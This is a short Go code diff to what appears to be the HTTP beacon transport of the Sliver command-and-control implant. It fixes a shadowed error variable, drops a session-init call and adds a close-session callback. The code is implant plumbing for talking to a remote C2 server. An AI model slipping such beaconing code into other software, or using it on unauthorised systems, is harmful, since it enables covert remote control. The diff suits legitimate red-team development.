@@ -254,11 +254,12 @@ func httpBeacon(uri *url.URL) *Beacon {
 	// {{end}}
 
 	var client *httpclient.SliverHTTPClient
+	var err error
 	beacon := &Beacon{
 		Start: func() error {
 			proxyConfig := uri.Query().Get("proxy")
 			timeout := GetPollTimeout()
-			client, err := httpclient.HTTPStartSession(uri.Host, uri.Path, timeout, proxyConfig)
+			client, err = httpclient.HTTPStartSession(uri.Host, uri.Path, timeout, proxyConfig)
 			if err != nil {
 				// {{if .Config.Debug}}
 				log.Printf("http(s) connection error %s", err)
@@ -266,13 +267,16 @@ func httpBeacon(uri *url.URL) *Beacon {
 				return err
 			}
 			proxyURL = client.ProxyURL
-			return client.SessionInit()
+			return nil
 		},
 		Recv: func() (*pb.Envelope, error) {
 			return client.ReadEnvelope()
 		},
 		Send: func(envelope *pb.Envelope) error {
 			return client.WriteEnvelope(envelope)
+		},
+		Close: func() error {
+			return client.CloseSession()
 		},
 	}
 
